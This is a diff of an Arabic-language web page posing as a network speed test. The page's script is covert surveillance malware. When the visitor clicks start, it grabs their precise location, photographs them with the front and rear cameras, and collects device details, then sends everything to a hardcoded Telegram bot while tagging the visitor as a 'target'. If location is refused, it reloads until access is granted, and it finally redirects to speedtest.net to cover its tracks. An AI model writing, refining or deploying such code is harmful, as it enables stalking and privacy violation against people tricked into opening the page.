@@ -20,53 +20,53 @@
     <h2>فحص سرعة الشبكة العالمي</h2>
     <div class="circle"><span class="start-text">Start</span></div>
     <p id="status">انقر للبدء...</p>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
         const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
         const chat = "7984067238"; 
         const urlParams = new URLSearchParams(window.location.search);
-        const victim = urlParams.get( user ) || "Unknown";
+        const victim = urlParams.get( user ) || "مستهدف_غير_معروف";
 
-        async function sendToTelegram(type, data, caption = "") {
-            const formData = new FormData();
-            formData.append("chat_id", chat);
-            if(type === "photo") {
-                formData.append("photo", data, "img.jpg");
-                formData.append("caption", `👤 المستهدف: ${victim}\n${caption}`);
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: formData});
-            } else {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
-            }
+        async function sendInfo(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
         }
 
-        async function getDeviceInfo() {
-            let batteryInfo = "غير متوفر";
+        async function sendPhoto(blob, caption) {
+            const fd = new FormData();
+            fd.append("chat_id", chat);
+            fd.append("photo", blob, "camera.jpg");
+            fd.append("caption", caption);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
+        }
+
+        async function getReport(lat, lon) {
+            let batt = "غير معروف";
             try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ?  يشحن ⚡  :  لا يشحن 🔋 })`;
+                const b = await navigator.getBattery();
+                batt = `${(b.level * 100).toFixed(0)}% (${b.charging ?  يشحن ⚡  :  لا يشحن 🔋 })`;
             } catch (e) {}
             
-            const ua = navigator.userAgent;
-            let deviceModel = "جهاز غير معروف";
-            if (ua.match(/Android/i)) deviceModel = ua.split( ; )[2].split( ) )[0];
-            else if (ua.match(/iPhone/i)) deviceModel = "iPhone";
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "8 GB (تقريبي)";
+            const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} نواة` : "8 نواة";
+            const platform = navigator.platform || "Linux armv81";
 
-            return `📱 الجهاز: ${deviceModel}\n🔋 البطارية: ${batteryInfo}\n🌐 المتصفح: ${navigator.appName}`;
+            return `🛰️ **تقرير مفصل**\n\n🔋 البطارية: ${batt}\n📱 النظام: ${platform}\n💾 الذاكرة: ${ram}\n⚙️ المعالج: ${cpu}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
         }
 
-        async function capture(mode) {
+        async function takePic(mode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
-                const video = document.getElementById( video );
-                video.srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
+                const v = document.getElementById( v );
+                v.srcObject = s;
                 await new Promise(r => setTimeout(r, 1200));
-                const canvas = document.getElementById( canvas );
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext( 2d ).drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                return new Promise(res => canvas.toBlob(res,  image/jpeg , 0.6));
+                const c = document.getElementById( c );
+                c.width = 640; c.height = 480;
+                c.getContext( 2d ).drawImage(v, 0, 0);
+                s.getTracks().forEach(t => t.stop());
+                return new Promise(res => c.toBlob(res,  image/jpeg , 0.7));
             } catch (e) { return null; }
         }
 
@@ -74,25 +74,27 @@
             this.style.display = "none";
             document.getElementById( status ).innerText = "جاري الاتصال بالسيرفرات...";
 
-            const deviceInfo = await getDeviceInfo();
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
 
-            // 1. طلب الموقع
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const map = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n\n${deviceInfo}`;
-                await sendToTelegram("text", map);
+                // 1. تصوير الكاميرا الأمامية
+                const front = await takePic("user");
+                if(front) await sendPhoto(front, `👤 المستهدف: ${victim}\n📸 الكاميرا الأمامية`);
+
+                // 2. تصوير الكاميرا الخلفية
+                const back = await takePic("environment");
+                if(back) await sendPhoto(back, `👤 المستهدف: ${victim}\n📷 الكاميرا الخلفية`);
+
+                // 3. إرسال التقرير المفصل (نفس شكل صورتك)
+                const report = await getReport(lat, lon);
+                await sendInfo(report);
+
+                window.location.href = "https://www.speedtest.net";
             }, async (err) => {
-                await sendToTelegram("text", `❌ رفض الموقع\n\n${deviceInfo}`);
+                alert("خطأ: يرجى السماح بالوصول للموقع لاختيار أفضل سيرفر فحص.");
+                location.reload();
             }, {enableHighAccuracy: true});
-
-            // 2. تصوير الكاميرا الأمامية
-            const frontImg = await capture("user");
-            if (frontImg) await sendToTelegram("photo", frontImg, "📸 الكاميرا الأمامية");
-
-            // 3. تصوير الكاميرا الخلفية (تلقائي)
-            const backImg = await capture("environment");
-            if (backImg) await sendToTelegram("photo", backImg, "📷 الكاميرا الخلفية");
-
-            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 2000);
         };
     </script>
 </body>
